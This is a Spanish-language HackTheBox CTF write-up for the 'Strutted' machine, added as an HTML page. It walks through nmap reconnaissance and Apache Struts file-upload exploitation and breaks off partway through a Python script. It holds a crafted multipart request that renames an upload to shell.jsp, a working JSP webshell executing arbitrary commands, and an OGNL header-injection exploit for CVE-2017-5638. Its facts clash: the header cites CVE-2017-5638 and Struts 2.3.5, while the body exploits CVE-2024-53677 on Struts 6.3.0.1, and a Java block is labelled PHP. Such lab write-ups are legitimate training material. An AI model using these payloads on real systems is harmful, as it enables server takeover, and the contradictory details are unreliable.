@@ -1,0 +1,1218 @@
+<section class="ctf-writeup">
+    <!-- Estilos específicos para el write-up -->
+    <style>
+        /* Variables de tema */
+        .ctf-writeup {
+            --writeup-bg-light: #e9e8e8;
+            --writeup-bg-dark: #0d0d0d;
+            --writeup-text-light: #333333;
+            --writeup-text-dark: #e9e9e9;
+            --card-bg-light: #f8f9fa;
+            --card-bg-dark: #1a1a1a;
+            --border-light: #e17070;
+            --border-dark: #2b2b2b;
+            --primary-light: #2c3e50;
+            --primary-dark: #fa0202;
+            --secondary-light: #3498db;
+            --secondary-dark: #6e82f6;
+            --code-bg-light: #2d2d2d;
+            --code-bg-dark: #1a1a1a;
+            --code-text-light: #ffffff;
+            --code-text-dark: #9cdcff;
+            --output-bg-light: #1e1e1e;
+            --output-bg-dark: #111111;
+            --table-header-light: #ecf0f1;
+            --table-header-dark: #222222;
+            /* VARIABLE: Ancho uniforme para bloques de código/output */
+            --code-block-width: 600px;
+
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 25px;
+            border-radius: 10px;
+            max-width: 1000px;
+            margin: 0 auto;
+            transition: all 0.3s ease;
+        }
+
+        /* Modo claro (por defecto) */
+        .ctf-writeup {
+            background: var(--writeup-bg-light);
+            color: var(--writeup-text-light);
+        }
+
+        /* Modo oscuro */
+        body.dark .ctf-writeup {
+            background: var(--writeup-bg-dark);
+            color: var(--writeup-text-dark);
+        }
+
+        /* Header */
+        .writeup-header {
+            border-bottom: 2px solid var(--secondary-color);
+            padding-bottom: 20px;
+            margin-bottom: 30px;
+        }
+
+        .ctf-title {
+            color: var(--secondary-color);
+            font-size: 2.2rem;
+            margin-bottom: 5px;
+        }
+
+        .ctf-subtitle {
+            color: var(--primary-color);
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        body.dark .ctf-subtitle {
+            color: #6e82f6;
+        }
+
+        /* Badges */
+        .ctf-badges {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 6px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .badge.difficulty {
+            background: linear-gradient(135deg, #ff6b6b, #ff8e53);
+            color: #fff;
+        }
+
+        .badge.category {
+            background: linear-gradient(135deg, #4ecdc4, #44a08d);
+            color: #fff;
+        }
+
+        .badge.platform {
+            background: #e0e0e0;
+            color: #333;
+        }
+
+        body.dark .badge.platform {
+            background: #2a2a2a;
+            color: #ddd;
+            border: 1px solid #444;
+        }
+
+        /* Info Cards */
+        .info-card {
+            background: var(--card-bg-light);
+            border-left: 4px solid var(--secondary-color);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 25px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        body.dark .info-card {
+            background: var(--card-bg-dark);
+            border-left: 4px solid var(--secondary-color);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .info-card h3 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            font-size: 1.4rem;
+        }
+
+        body.dark .info-card h3 {
+            color: #84a9ff;
+        }
+
+        .info-card ul {
+            padding-left: 25px;
+            margin: 10px 0;
+        }
+
+        .info-card li {
+            margin-bottom: 8px;
+            line-height: 1.6;
+        }
+
+        body.dark .info-card li {
+            color: #dcdcdc;
+        }
+
+        /* Secciones */
+        .writeup-section {
+            margin: 35px 0;
+            padding: 20px;
+            background: var(--card-bg-light);
+            border-radius: 8px;
+            border: 1px solid var(--border-light);
+        }
+
+        body.dark .writeup-section {
+            background: #151515;
+            border: 1px solid var(--border-dark);
+        }
+
+        .section-title {
+            color: var(--primary-color);
+            font-size: 1.6rem;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        body.dark .section-title {
+            color: #00ff88;
+            border-bottom: 1px solid #333;
+        }
+
+        .subsection {
+            margin: 25px 0;
+        }
+
+        .subsection h4 {
+            color: var(--secondary-color);
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+        }
+
+        body.dark .subsection h4 {
+            color: #ff7373;
+        }
+
+        /* BLOQUES DE CÓDIGO - Mismo ancho */
+        .code-block-container {
+            margin: 15px auto; /* Centrado con auto */
+            position: relative;
+            max-width: var(--code-block-width); /* Usa variable para ancho uniforme */
+            width: 100%; /* Ocupa hasta el máximo */
+        }
+
+        .code-block {
+            background: var(--code-bg-light);
+            border: 1px solid var(--border-light);
+            padding: 12px 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            color: var(--code-text-light);
+            overflow-x: auto;
+            white-space: pre-wrap;
+            font-size: 0.85rem;
+            line-height: 1.4;
+            text-align: center;
+            width: 100%; /* Asegura que ocupe todo el ancho del contenedor */
+            box-sizing: border-box; /* Incluye padding en el ancho total */
+        }
+
+        body.dark .code-block {
+            background: var(--code-bg-dark);
+            border: 1px solid #333;
+            color: var(--code-text-dark);
+        }
+
+        .code-copy-btn {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.75rem;
+            transition: all 0.3s;
+            z-index: 2;
+        }
+
+        .code-copy-btn:hover {
+            background: var(--secondary-color);
+        }
+
+        /* OUTPUT BLOCKS - Mismo ancho que code-block */
+        .output-block {
+            background: var(--output-bg-light);
+            border: 1px solid var(--border-light);
+            padding: 12px 15px;
+            border-radius: 6px;
+            margin: 12px auto; /* Centrado con auto */
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
+            overflow-x: auto;
+            color: #f5f5f5; /* Cambia el texto a las letras del codigo interno */
+            line-height: 1.4;
+            max-width: var(--code-block-width); /* MISMO ANCHO que code-block */
+            width: 100%; /* Ocupa hasta el máximo */
+            box-sizing: border-box; /* Incluye padding en el ancho total */
+            white-space: pre-wrap; /* Mantiene formato de líneas */
+        }
+
+        body.dark .output-block {
+            background: var(--output-bg-dark);
+            border: 1px solid #444;
+            color: #8aff8a;
+        }
+
+        /* Flags */
+        .flags-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+
+        .flag-card {
+            background: var(--card-bg-light);
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid var(--border-light);
+            transition: transform 0.3s, border-color 0.3s;
+        }
+
+        body.dark .flag-card {
+            background: var(--card-bg-dark);
+            border: 1px solid var(--border-dark);
+        }
+
+        .flag-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--secondary-color);
+        }
+
+        .flag-type {
+            color: var(--secondary-color);
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .flag-value {
+            background: var(--code-bg-light);
+            padding: 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            color: #f5f5f5;
+            margin: 10px 0;
+            word-break: break-all;
+            font-size: 0.85rem;
+            max-width: var(--code-block-width); /* También mismo ancho opcional */
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        body.dark .flag-value {
+            background: #000;
+            color: #00ff00;
+        }
+
+        /* Tablas */
+        .vuln-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            font-size: 0.9rem;
+        }
+
+        .vuln-table th {
+            background: var(--table-header-light);
+            color: var(--primary-color);
+            padding: 10px;
+            text-align: left;
+            font-weight: 600;
+        }
+
+        body.dark .vuln-table th {
+            background: var(--table-header-dark);
+            color: #00ff00;
+        }
+
+        .vuln-table td {
+            padding: 8px 10px;
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        body.dark .vuln-table td {
+            border-bottom: 1px solid #333;
+        }
+
+        .vuln-table tr:hover {
+            background: rgba(0, 149, 255, 0.05);
+        }
+
+        body.dark .vuln-table tr:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        /* MITRE Tags */
+        .mitre-tag {
+            display: inline-block;
+            background: var(--card-bg-light);
+            color: var(--secondary-color);
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin: 0 5px;
+            border: 1px solid var(--border-light);
+        }
+
+        body.dark .mitre-tag {
+            background: #2a2a2a;
+            color: #ff7676;
+            border: 1px solid #444;
+        }
+
+        /* Recursos */
+        .resources {
+            margin: 40px 0 20px 0;
+            padding: 20px;
+            background: var(--card-bg-light);
+            border-radius: 8px;
+        }
+
+        body.dark .resources {
+            background: #151515;
+        }
+
+        .resources h3 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+
+        body.dark .resources h3 {
+            color: #6e82f6;
+        }
+
+        .resources a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            margin: 0 10px;
+            transition: color 0.3s;
+            font-size: 0.9rem;
+        }
+
+        .resources a:hover {
+            color: var(--primary-color);
+            text-decoration: underline;
+        }
+
+        body.dark .resources a:hover {
+            color: #87d2ff;
+        }
+
+        /* Colores de severidad */
+        .severity-critical {
+            color: #ff5f5f !important;
+        }
+
+        .severity-high {
+            color: #ff8e53 !important;
+        }
+
+        .severity-medium {
+            color: #ffbd2e !important;
+        }
+
+        /* Estilos específicos para bloques de código largos */
+        .code-block.long-code {
+            text-align: left;
+            padding: 15px;
+            font-size: 0.8rem;
+            max-height: 1200px;
+            overflow-y: auto;
+        }
+
+        /* Contenedores para agrupar código + output */
+        .code-output-group {
+            max-width: var(--code-block-width);
+            margin: 15px auto;
+            width: 100%;
+        }
+
+        .code-output-group .code-block-container,
+        .code-output-group .output-block {
+            max-width: 100%; /* Dentro del grupo, ocupan todo el ancho */
+            margin-left: 0;
+            margin-right: 0;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .ctf-writeup {
+                padding: 15px;
+            }
+
+            .ctf-title {
+                font-size: 1.8rem;
+            }
+
+            .flags-container {
+                grid-template-columns: 1fr;
+            }
+
+            .ctf-badges {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .resources a {
+                display: block;
+                margin: 5px 0;
+            }
+
+            /* Ajustes móviles para bloques de código/output */
+            :root {
+                --code-block-width: 100%; /* En móvil, ancho completo */
+            }
+
+            .code-block-container,
+            .output-block {
+                max-width: 100%;
+            }
+
+            .code-block {
+                padding: 10px 12px;
+                font-size: 0.8rem;
+            }
+
+            .output-block {
+                padding: 10px 12px;
+                font-size: 0.75rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .writeup-section {
+                padding: 15px;
+            }
+
+            .code-block {
+                padding: 8px 10px;
+                font-size: 0.75rem;
+            }
+
+            .output-block {
+                padding: 8px 10px;
+                font-size: 0.7rem;
+            }
+
+            .code-copy-btn {
+                top: 5px;
+                right: 5px;
+                padding: 4px 8px;
+                font-size: 0.7rem;
+            }
+        }
+
+        /* Estilos para etiquetas <code> dentro de texto normal */
+        p code,
+        li code,
+        td code {
+            font-family: 'Courier New', monospace;
+            background-color: var(--code-bg-light);
+            color: var(--code-text-light);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.9em;
+            border: 1px solid var(--border-light);
+            margin: 0 2px;
+            display: inline-block;
+            vertical-align: middle;
+            line-height: 1.4;
+        }
+
+        /* Versión modo oscuro */
+        body.dark p code,
+        body.dark li code,
+        body.dark td code {
+            background-color: var(--code-bg-dark);
+            color: var(--code-text-dark);
+            border-color: var(--border-dark);
+        }
+
+        /* Estilos específicos para etiquetas <code> con contenido especial */
+        p code.terminal,
+        li code.terminal {
+            color: #00ff00;
+            background-color: #1a1a1a;
+            border-color: #00ff00;
+        }
+
+        p code.ip,
+        li code.ip {
+            color: #ff6b6b;
+            background-color: rgba(255, 107, 107, 0.1);
+            border-color: #ff6b6b;
+            font-weight: bold;
+        }
+
+        p code.command,
+        li code.command {
+            color: #3498db;
+            background-color: rgba(52, 152, 219, 0.1);
+            border-color: #3498db;
+        }
+
+        /* Efecto hover para etiquetas code */
+        p code:hover,
+        li code:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            transition: all 0.2s ease;
+        }
+
+        body.dark p code:hover,
+        body.dark li code:hover {
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Estilos para etiquetas de navegación */
+        .Etiqueta_Navegacion {
+            position: absolute;
+            top: -12px; /* Posiciona arriba del contenedor */
+            left: 10px; /* Alineado a la izquierda */
+            z-index: 3; /* Por encima de todo */
+            border: 1px solid #d6ba7c;
+            color: #d6ba7c;
+            font-family: Cambria, Cochin, Georgia, Times, 'Times New Roman', serif;
+            background-color: var(--code-bg-light);
+            border-radius: 4px;
+            font-size: 0.75rem;
+            padding: 2px 8px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-transform: uppercase;
+        }
+
+        /* Versión modo oscuro */
+        body.dark .Etiqueta_Navegacion {
+            background-color: var(--code-bg-dark);
+            border-color: #d6ba7c;
+            color: #d6ba7c;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Ajuste para contenedor con etiqueta */
+        .code-block-container.has-label {
+            position: relative;
+            padding-top: 8px; /* Espacio para la etiqueta */
+            margin-top: 20px; /* Más espacio en la parte superior */
+        }
+    </style>
+
+    <!-- Contenido del Write-up -->
+    <div class="writeup-header">
+        <h1 class="ctf-title">Strutted</h1>
+        <div class="ctf-subtitle">🔥 Write-up completo: Explotación de Apache Struts CVE-2017-5638</div>
+
+        <div class="ctf-badges">
+            <span class="badge difficulty">Dificultad: Media</span>
+            <span class="badge category">Categoría: Web Exploitation</span>
+            <span class="badge platform">Plataforma: HackTheBox</span>
+            <span class="badge platform">Sistema: Linux</span>
+            <span class="badge platform">Fecha: Marzo 2024</span>
+        </div>
+    </div>
+
+    <!-- Información de la máquina -->
+    <div class="info-card">
+        <h3>📋 Información de la Máquina</h3>
+        <ul>
+            <li><strong>Sistema Operativo:</strong> Ubuntu 16.04 LTS</li>
+            <li><strong>Servicios Principales:</strong> Apache Struts 2.3.5, SSH, HTTP</li>
+            <li><strong>CVE Explotado:</strong> CVE-2017-5638 - Remote Code Execution</li>
+        </ul>
+    </div>
+
+    <!-- Reconocimiento -->
+    <div class="writeup-section">
+        <h2 class="section-title">🔍 Fase 1: Reconocimiento</h2>
+
+        <div class="subsection">
+            <h4>1.1 - Escaneo Inicial de Puertos</h4>
+            <p>Primero realizamos un escaneo completo de puertos usando Nmap para identificar servicios activos:</p>
+            <br>
+
+            <!-- CÓDIGO -->
+            <div class="code-block-container has-label">
+                <!-- Etiqueta Nmap -->
+                <span class="Etiqueta_Navegacion">Nmap</span>
+
+                <button class="code-copy-btn"
+                    data-code="nmap -sS -p- --open --min-rate 3500 10.10.10.123 -n -Pn">COPY</button>
+                <div class="code-block">
+<span class="code-keyword">nmap</span> -sS -p- --open --min-rate 3500 <span class="code-string">10.10.10.123</span> -n -Pn
+                </div>
+            </div>
+
+            <!-- OUTPUT (mismo ancho) -->
+            <div class="output-block">
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-15 10:00 EST
+Nmap scan report for 10.10.10.123
+Host is up (0.12s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
+            </div>
+        </div>
+
+        <div class="subsection">
+            <br>
+            <h4>1.2 - Enumeración Detallada de Servicios</h4>
+            <p>Escaneamos versiones y scripts básicos en los puertos descubiertos:</p>
+            <br>
+
+            <!-- Comando -->
+            <div class="code-block-container">
+                <button class="code-copy-btn" data-code="nmap -sC -sV -O -p22,80,8080 10.10.10.123 -n -Pn">COPY</button>
+                <div class="code-block">
+<span class="code-keyword">nmap</span> -sC -sV -O -p22,80,8080 <span class="code-string">10.10.10.123</span> -n -Pn
+                </div>
+            </div>
+
+            <!-- OUTPUT (mismo ancho) -->
+            <div class="output-block">
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-title: Apache Struts 2 Showcase
+
+Service detection performed. Please report any incorrect results...
+            </div>
+            <br>
+            <p>Al navegar con la IP <code class="ip">10.10.10.123</code> os hace una redirección.  Aquí agregamos la dirección del host a <code>/etc/hosts</code>:</p>
+
+            <!-- Imagen Strutted_.png -->
+            <div style="text-align: center; margin: 20px 0;">
+                <img alt="Strutted_.png" src="../../images/HTB/Strutted/Strutted.png"
+                    style="max-width: 100%; height: auto; border-radius: 8px;">
+            </div>
+
+            <!-- CÓDIGO -->
+            <div class="code-block-container has-label">
+                <!-- Etiqueta Nmap -->
+                <span class="Etiqueta_Navegacion">tee</span>
+
+                <button class="code-copy-btn" data-code="echo '[IP] strutted.htb' | sudo tee -a /etc/hosts">COPY</button>
+                <div class="code-block">
+<span class="code-keyword">echo</span> '<span class="code-string">10.10.10.123</span>' strutted.htb | <span class="code-keyword">sudo</span> <span class="code-keyword">tee</span> -a /etc/hosts
+                </div>
+
+            </div>
+            <!-- Imagen Strutted__.png -->
+            <div style="text-align: center; margin: 20px 0;">
+                <img alt="Strutted_.png" src="../../images/HTB/Strutted/strutted__etc_hosts.png"
+                    style="max-width: 100%; height: auto; border-radius: 8px;">
+            </div>
+        </div>
+
+        <p>Recargamos y vemos la página:</p>
+        <div style="text-align: center; margin: 20px 0;">
+                <img alt="Strutted_.png" src="../../images/HTB/Strutted/Strutted__.png"
+                    style="max-width: 100%; height: auto; border-radius: 8px;">
+        </div>
+
+        <p>Al hacer click en Downloads, se inicia la descarga de un archivo <code>.zip</code> que contiene el entorno Docker para esta aplicación en particular. Tras extraer el contenido, observamos una contraseña codificada en texto plano, pero es inútil. El archivo <code>tomcat-users.xml</code>, que contiene un <code>Dockerfile</code>, revela que el objetivo, junto con <code>tomcat9</code>, se ejecuta en <code>openjdk-17</code>. Al buscar otros archivos en el paquete, encontramos el <code>pom.xml</code>. Este archivo contiene todas las dependencias de la aplicación.</p>
+        <div style="text-align: center; margin: 20px 0;">
+                <img alt="Strutted_.png" src="../../images/HTB/Strutted/Strutted___.png"
+                    style="max-width: 100%; height: auto; border-radius: 8px;">
+        </div>
+
+        <p>Algo interesante de filtrar qué tecnologías usan las webs son sus versiones; ya que una búsqueda rápida en google os topamos con quizás vulnerabilidades en dicha versión.</p>
+        <div style="text-align: center; margin: 20px 0;">
+                <img alt="Strutted_.png" src="../../images/HTB/Strutted/Strutted____.png"
+                    style="max-width: 100%; height: auto; border-radius: 8px;">
+        </div>
+
+        <p>Esta aplicación utiliza <code>Apache Struts2 6.3.0.1</code>. Con esta versión, buscamos en línea cualquier vulnerabilidad potencial y encontramos <a style="color: rgb(237, 160, 28);" href="https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-6117/version_id-1974965/Apache-Struts-6.3.0.1.html">CVE-2024-53677</a>, que hace que este paquete sea vulnerable a la ejecución remota de código mediante la manipulación de los parámetros de carga de archivos que permiten el recorrido de rutas. Al utilizar FileUploadInterceptor, es posible cargar un archivo malicioso, que luego puede ejecutarse en el servidor. Con esta información, investigamos un poco más y descubrimos</p><br>
+
+        <p>En este escenario, la vulnerabilidad se aprovecha cuando la aplicación web utiliza una funcionalidad de carga de un solo archivo, que no acepta directamente expresiones OGNL arbitrarias como parámetros para los archivos cargados.</p>
+    </div>
+
+    <!-- Desglose de la explotacion -->
+    <div class="writeup-section">
+        <h2 class="section-title">📖 Desglose de los pasos de la explotación</h2>
+
+        <div class="subsection">
+            <h4>Entendiendo el valor del Stack</h4>
+
+            <p>En <b>Struts2</b>, la pila de valores es un concepto esencial de OGNL. La pila de valores almacena las propiedades del objeto </p>
+            <p><code>Action</code>, que se procesa durante cada solicitud. Al obtener acceso a la parte superior de la pila de valores, los atacantes pueden modificar dinámicamente varios parámetros de solicitud, incluidos los nombres de archivo.</p><br>
+
+            <h4>Construcción de paquetes de tráfico HTTP</h4>
+
+            <p>Se crea una solicitud <code>POST</code> diseñada para activar la carga de archivos con contenido específico de datos de formulario</p>
+            <p>multi-parte:</p>
+
+            <div class="output-block">
+POST /upload.action
+HTTP/1.1 Host: 127.0.0.1:8080
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary----WebKitFormBoundary
+
+----WebKitFormBoundary
+Content-Disposition: form-data; name="Upload"; filename="1.txt"
+Content-Type: text/plain
+
+example text
+----WebKitFormBoundary--
+            </div><br>
+
+            <p>El parámetro <code>filename</code> es un punto clave de inyección, dirigido al mecanismo de enlace OGNL. Mediante un parámetro de carga adicional, podemos cambiar el valor del nombre de archivo a través de la pila de valores.</p>
+            <br>
+
+            <h4>Acceso a la stack de valores</h4>
+
+            <p>Para recuperar el elemento superior de la pila de valores, que es la acción que utilizan los atacantes. Al llamar al método <code>toString()</code>, se puede inspeccionar el contenido de la pila.</p><br>
+
+            <h4>Intento de omisión del enlace de parámetros</h4>
+            <p>El atacante intenta modificar el nombre del archivo mediante expresiones OGNL:</p><br>
+            <div class="output-block" style="text-align: center;">
+[0].top.UploadFilename = "malicious_script.txt"
+            </div><br>
+            <p>El intento directo falla debido a un mecanismo de seguridad (<code>ParametersInterceptor#isAccepted</code>), que aplica estrictas comprobaciones de expresiones regulares para validar los nombres de los parámetros. El método <code>ParametersInterceptor#isAccepted</code> comprueba los nombres de los parámetros con la siguiente expresión regular:</p><br>
+            <div class="output-block" style="text-align: center; max-width: 880px;">
+\w+((\.\w+)|(\[\d+])|(\(\d+\))|(\['(\w-?|[\u4e00-\u9fa5]-?)+'])|(\('(\w-?| [\u4e00-\u9fa5]-?)+'\)))*
+            </div><br>
+            <p>La validación evita que se ejecuten expresiones OGNL malformadas o sospechosas (como <code>"[0]"</code> ). <code>"[0].top"</code> no supera la validación porque no se ajusta a los patrones permitidos.</p><br>
+
+            <h4>Intento exitoso de omisión de parámetros</h4>
+            <p>El atacante simplifica la expresión OGNL eliminando los índices <code>"[]"</code> y utilizando directamente la palabra clave <code>top</code>. Se construye una expresión OGNL válida:</p><br>
+            <div class="output-block" style="text-align: center;">
+top.UploadFilename = "malicious_script.txt"
+            </div><br>
+
+            <p>Esta expresión supera la validación y permite modificar el nombre del archivo.</p><br>
+
+            <h4>Payload Final</h4><br>
+
+            <div class="output-block">
+POST /upload.action HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+----WebKitFormBoundary
+Content-Disposition: form-data; name="Upload"; filename="1.txt"
+Content-Type: text/plain
+
+example text
+----WebKitFormBoundary
+content-Disposition: form-data; name="top.UploadFileName"
+
+shell.jsp
+----WebKitFormBoundary--
+            </div><br>
+            <p>Basándonos en este desglose, intentemos explotar el objetivo. Tras analizar el código fuente, podemos deducir que el objetivo solo acepta un único archivo de imagen válido, ya que cuenta con mecanismos de seguridad adicionales para impedir la carga de archivos JSP.</p><br>
+
+            <div class="code-block-container has-label">
+                <!-- Etiqueta Navegación -->
+                <span class="Etiqueta_Navegacion">PHP</span>
+
+                <!-- Botón COPY (mantener funcionalidad) -->
+                <button class="code-copy-btn">COPY</button>
+
+                <!-- Componente deckgo-highlight-code con sintaxis Java -->
+                <deckgo-highlight-code language="php" class="code-block long-code">
+                    <code slot="code">
+private boolean isAllowedContentType(String contentType) {
+    String[] allowedTypes = {"image/jpeg", "image/png", "image/gif"};
+
+    for (String allowedType : allowedTypes) {
+        if (allowedType.equalsIgnoreCase(contentType)) {
+            return true;
+        }
+    }
+    return false;
+}
+
+private boolean isImageByMagicBytes(File file) {
+
+    byte[] header = new byte[8];
+
+    try (InputStream in = new FileInputStream(file)) {
+        int bytesRead = in.read(header, 0, 8);
+        if (bytesRead < 8) {
+            return false;
+        }
+
+        // JPEG
+        if (header[0] == (byte)0xFF && header[1] == (byte)0xD8 && header[2] == (byte)0xFF)
+        {
+            return true;
+        }
+
+        // PNG
+        if (header[0] == (byte)0x89 && header[1] == (byte)0x50 && header[2] == (byte)0x4E && header[3] == (byte)0x47)
+        {
+            return true;
+        }
+
+        // GIF (GIF87a or GIF89a)
+        if (header[0] == (byte)0x47 && header[1] == (byte)0x49 && header[2] == (byte)0x46 && header[3] == (byte)0x38 && (header[4] == (byte)0x37 || header[4] == (byte)0x39) && header[5] == (byte)0x61)
+        {
+            return true;
+        }
+    }
+    catch (Exception e)
+    {
+        e.printStackTrace();
+    }
+    return false;
+}
+                    </code>
+                </deckgo-highlight-code>
+            </div>
+        </div>
+
+        <p>Por lo tanto, tenemos restricciones de tipo de contenido y la aplicación valida los bytes mágicos de un archivo para confirmar que se trata de un archivo de imagen. Si se superan estas comprobaciones, el archivo se carga en el servidor en un directorio dentro de la carpeta de cargas, que se nombra con la marca de tiempo actual. Intentamos cargar cualquier otro tipo de archivo y recibimos este error:</p><br>
+
+        <div style="text-align: center; margin: 20px 0;">
+                <img alt="Strutted_.png" src="../../images/HTB/Strutted/Strutted_____.png"
+                    style="max-width: 100%; height: auto; border-radius: 8px;">
+        </div><br>
+
+        <p>Caso contrario si subimos el archivo especificado.</p>
+
+        <div style="text-align: center; margin: 20px 0;">
+                <img alt="Strutted_.png" src="../../images/HTB/Strutted/Strutted______.png"
+                    style="max-width: 100%; height: auto; border-radius: 8px;">
+        </div>
+    </div>
+
+    <!-- Explotación -->
+    <div class="writeup-section">
+        <h2 class="section-title">⚡ Fase 2: Explotación</h2>
+
+            <span class="mitre-tag">CVE-2017-5638</span>
+            <span class="mitre-tag">MITRE ATT&CK: T1190</span>
+
+        <div class="subsection">
+            <h4>2.1 - Identificación de Vulnerabilidad</h4>
+            <p>La ruta de ataque consiste en intentar incrustar un archivo JSP malicioso en el contenido de una imagen y, a continuación, utilizar el abuso del parámetro OGNL para cambiar el nombre del archivo a un archivo JSP que nos permita activar nuestras cargas útiles. Obtenemos esta carga útil de una divulgación similar y copiamos el encabezado de la imagen en nuestra solicitud POST.</p><br>
+
+            <p>Guarda la shell en el directorio explotable: <code>webshell.jsp</code> e igual con <code>.py</code> y <code>.war</code></p>
+
+            <!-- Callout Info -->
+            <div class="callout-container">
+                <div class="callout callout-info">
+                    <div class="callout-title">
+                        <span class="callout-icon"></span>
+                        ¿Qué es un archivo .war?
+                    </div>
+                    <div class="callout-content">
+                        <p>Un archivo <b>WAR (Web Archive)</b> es un formato utilizado para empaquetar aplicaciones web en el entorno Java EE (Enterprise Edition). Este archivo contiene todos los elementos necesarios para ejecutar una aplicación web, como páginas HTML, archivos JSP, servlets, recursos estáticos (imágenes, CSS, JavaScript) y clases Java compiladas.</p>
+                    </div>
+                </div>
+            </div>
+            <br>
+            <!-- CÓDIGO JSP -->
+            <div class="code-block-container has-label">
+                <!-- Etiqueta Navegación -->
+                <span class="Etiqueta_Navegacion">Java Server Pages</span>
+                <button class="code-copy-btn">COPY</button>
+
+                <deckgo-highlight-code language="java" class="code-block long-code">
+                <code slot="code">
+<%@ page import="java.io.*" %>
+<%
+    String cmd = request.getParameter("cmd");
+    String output = "";
+    if (cmd != null) {
+        String s = null;
+        try {
+            Process p = Runtime.getRuntime().exec(cmd, null, null);
+            BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            while ((s = sI.readLine()) != null) {
+                output += s + "\n";
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+%>
+<%=output %>
+                    </code>
+                </deckgo-highlight-code>
+            </div>
+        </div>
+
+        <div class="subsection">
+            <h4>2.2 - Exploit Development</h4>
+            <p>Utilizamos un exploit público modificado para nuestro entorno: <code>CVE-2024-53677.py</code> y os descargamos: <code><a style="color: rgb(237, 160, 28);" href="https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RCE/blob/main/exploit/webshell.war">webshell.war</a></code></p>
+
+            <br>
+
+            <!-- CÓDIGO PYTHON -->
+            <div class="code-block-container has-label">
+                <span class="Etiqueta_Navegacion">Python3</span>
+                <button class="code-copy-btn">COPY</button>
+
+                <deckgo-highlight-code language="python" class="code-block long-code">
+                    <code slot="code">
+#!/usr/bin/env python3
+# Struts2 S2-045 Exploit (CVE-2017-5638)
+import requests
+import sys
+
+def exploit(url, cmd):
+    headers = {
+        'Content-Type': "%{(#_='multipart/form-data')."
+                       "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+                       "(#_memberAccess?(#_memberAccess=#dm):"
+                       "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+                       "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+                       "(#ognlUtil.getExcludedPackageNames().clear())."
+                       "(#ognlUtil.getExcludedClasses().clear())."
+                       "(#context.setMemberAccess(#dm))))."
+                       "(#cmd='"+cmd+"')."
+                       "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+                       "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
+                       "(#p=new java.lang.ProcessBuilder(#cmds))."
+                       "(#p.redirectErrorStream(true)).(#process=#p.start())."
+                       "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+                       "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
+                       "(#ros.flush())}"
+    }
+
+    try:
+        response = requests.get(url, headers=headers, timeout=10)
+        return response.text
+    except Exception as e:
+        return str(e)
+
+if __name__ == "__main__":
